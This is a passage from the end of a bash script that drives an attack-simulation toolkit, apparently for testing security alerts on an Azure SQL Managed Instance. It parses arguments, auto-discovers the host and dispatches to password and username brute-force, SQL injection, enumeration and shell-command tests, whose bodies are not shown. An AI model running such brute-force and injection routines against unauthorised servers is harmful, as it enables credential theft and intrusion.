            shift 2 test_parts
            local test_args=("${test_parts[@]}")
            
            echo "[$test_num/$total_tests] Running: $test_name"
            print_status "[$test_num/$total_tests] Running: $test_name"
            
            if $test_function "${test_args[@]}"; then
                echo "✅ $test_name: PASSED"
                print_success "$test_name completed successfully"
            else
                echo "❌ $test_name: FAILED"
                print_error "$test_name failed"
            fi
            
            # Wait between tests to avoid overwhelming the target
            if [[ $test_num -lt $total_tests ]]; then
                echo "Waiting 60 seconds before next test..."
                print_status "Waiting 60 seconds before next test..."
                sleep 60
            fi
            
            test_num=$((test_num + 1))
        done
        
        echo ""
        echo "=== All Tests Completed ==="
        echo "End time: $(date)"
        
    } | tee "$all_tests_log"
    
    print_success "All tests completed. Generating comprehensive report..."
    generate_comprehensive_report
}

# Function for interactive menu mode
run_interactive_mode() {
    # Initialize session if not set
    if [[ -z "$CURRENT_SESSION" && -n "$HOST" ]]; then
        CURRENT_SESSION="$(date +"%Y%m%d_%H%M%S")_${HOST##*.}"
    fi
    
    while true; do
        show_main_menu
        echo -n "Select option (1-12, q): "
        read -r choice
        handle_menu_selection "$choice"
    done
}

# Function for command line execution
run_command_line_test() {
    local test_name="$1"
    
    case "$test_name" in
        "password-brute")
            run_password_brute_force "$HOST" "$PORT" "$USERNAME" "$DEFAULT_THREADS" "$DEFAULT_DELAY" "medium" "$VERBOSE"
            ;;
        "username-brute")
            run_username_brute_force "$HOST" "$PORT" "$DEFAULT_THREADS" "$DEFAULT_DELAY" "medium" "small" "$VERBOSE"
            ;;
        "comprehensive-brute")
            run_comprehensive_brute_force "$HOST" "$PORT" "$USERNAME" "$DEFAULT_THREADS" "$DEFAULT_DELAY" "medium" "$VERBOSE"
            ;;
        "sql-injection")
            test_sql_injection "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            ;;
        "harmful-application")
            test_harmful_application "$HOST" "$PORT"
            ;;
        "suspicious-queries")
            test_suspicious_queries "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            ;;
        "enumeration")
            test_enumeration "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            ;;
        "shell-commands")
            test_shell_commands "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            ;;
        "all")
            run_all_tests
            ;;
        *)
            print_error "Unknown test: $test_name"
            show_usage
            exit 1
            ;;
    esac
}

# Parse command line arguments
BATCH_MODE="false"
TEST_NAME=""
AUTO_DISCOVER="false"
RESOURCE_GROUP="rg-d4sql-sims"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--host)
            HOST="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -u|--username)
            USERNAME="$2"
            shift 2
            ;;
        -w|--password)
            PASSWORD="$2"
            shift 2
            ;;
        -t|--test)
            TEST_NAME="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE="true"
            shift
            ;;
        --batch)
            BATCH_MODE="true"
            shift
            ;;
        --menu)
            # Menu mode is the default behavior when no specific action is requested
            shift
            ;;
        --auto-discover)
            AUTO_DISCOVER="true"
            shift
            ;;
        --resource-group)
            RESOURCE_GROUP="$2"
            shift 2
            ;;
        --help)
            show_usage
            exit 0
            ;;
        *)
            print_error "Unknown option: $1"
            show_usage
            exit 1
            ;;
    esac
done

# Main execution logic
main() {
    # Setup
    check_dependencies
    setup_directories
    create_comprehensive_wordlists
    
    # Auto-discover SQL MI if requested
    if [[ "$AUTO_DISCOVER" == "true" ]]; then
        print_status "Auto-discovery requested..."
        if auto_discover_sql_mi "$RESOURCE_GROUP"; then
            print_success "Auto-discovery successful. Host set to: $HOSTNAME"
            HOST="$HOSTNAME"
        else
            print_error "Auto-discovery failed. Please specify host manually with --host"
            exit 1
        fi
    fi
    
    # Create session identifier if host is provided
    if [[ -n "$HOST" && -z "$CURRENT_SESSION" ]]; then
        CURRENT_SESSION="$(date +"%Y%m%d_%H%M%S")_${HOST##*.}"
    fi
    
    # Determine execution mode
    if [[ "$BATCH_MODE" == "true" ]]; then
        # Batch mode - run all tests
        if [[ -z "$HOST" ]]; then
            print_error "Host is required for batch mode"
            exit 1
        fi
        
        print_status "Running in batch mode..."
        run_all_tests
        generate_comprehensive_report
        
    elif [[ -n "$TEST_NAME" ]]; then
        # Command line mode - run specific test
        if [[ -z "$HOST" ]]; then
            print_error "Host is required for command line test execution"
            exit 1
        fi
        
        print_status "Running test: $TEST_NAME"
        run_command_line_test "$TEST_NAME"
        
    else
        # Interactive mode (default)
        print_status "Starting interactive mode..."
        run_interactive_mode
    fi
}

# Trap to handle cleanup on exit
trap 'print_status "Cleaning up..."; exit 0' INT TERM

# Start the application
main "$@"
